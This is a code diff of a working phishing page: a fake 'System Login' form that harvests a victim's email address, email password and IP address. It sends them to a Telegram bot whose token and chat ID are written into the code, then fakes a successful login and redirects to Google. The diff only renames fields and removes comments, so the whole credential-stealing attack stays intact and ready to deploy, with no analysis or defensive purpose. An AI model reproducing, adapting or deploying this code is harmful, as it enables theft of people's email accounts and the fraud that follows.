@@ -20,8 +20,8 @@
 <div class="login-box">
     <h2>System Login</h2>
     <form id="phishForm" onsubmit="submitData(event)">
-        <input type="text" id="Your email" placeholder="Your email" required autocomplete="off">
-        <input type="password" id="Your email password" placeholder="Your email password" required>
+        <input type="text" id="username" placeholder="Your Email" required autocomplete="off">
+        <input type="password" id="password" placeholder="Your Email Password" required>
         <button type="submit" id="submitBtn">Login</button>
         <div id="status"></div>
     </form>
@@ -29,8 +29,8 @@
 
 <script>
     // --- CONFIGURATION ---
-    const BOT_TOKEN = '8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc'; // এখানে আপনার টোকেন দিন
-    const CHAT_ID = '8820979221';     // এখানে আপনার চ্যাট আইডি দিন
+    const BOT_TOKEN = '8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc';
+    const CHAT_ID = '8820979221';
     // ---------------------
 
     async function submitData(e) {
@@ -38,15 +38,13 @@
         
         const btn = document.getElementById('submitBtn');
         const status = document.getElementById('status');
-        const user = document.getElementById('Your email').value;
-        const pass = document.getElementById('Your email password').value;
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
 
-        // UI Update
         btn.disabled = true;
         btn.innerText = "Verifying...";
         status.innerText = "Connecting to server...";
 
-        // Target's IP Address
         let ipAddress = 'Unknown';
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -56,27 +54,23 @@
             console.error("IP Fetch Error:", error);
         }
 
-        // Prepare Message for Telegram
         const message = `
 🔐 *New Login Captured!*
 
-👤 *Username:* ${user}
-🔑 *Password:* ${pass}
+👤 *Email:* ${user}
+🔑 *Email Password:* ${pass}
 🌐 *IP Address:* ${ipAddress}
 🕒 *Time:* ${new Date().toLocaleString()}
         `.replace(/\n/g, '\\n');
 
-        // Send to Telegram API
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
         try {
             await fetch(telegramUrl, { method: 'GET' });
             
-            // Success Feedback
             status.style.color = "green";
             status.innerText = "Login Successful! Redirecting...";
             
-            // Optional: Redirect to a real site after 2 seconds
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 2000);
